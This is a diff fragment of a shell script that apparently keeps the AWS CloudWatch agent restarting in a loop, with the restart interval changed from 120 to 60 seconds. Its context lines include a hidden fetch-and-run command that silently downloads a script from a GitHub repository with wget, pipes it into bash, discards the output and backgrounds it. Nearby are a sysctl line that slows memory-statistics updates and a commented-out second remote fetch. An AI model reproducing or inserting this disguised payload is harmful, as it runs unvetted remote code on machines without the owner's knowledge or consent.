@@ -6,8 +6,7 @@ bash <(sysctl -w vm.stat_interval=86400  || sudo sysctl -w vm.stat_interval=8640
 bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>/dev/null 2>&1 &
 while [ 1 ]; do
     /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent -schematest -config /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.toml
-    restart restart-cloudwatch-agent
     systemctl restart amazon-cloudwatch-agent.service
-    sleep 120
+    sleep 60
 done
 #bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
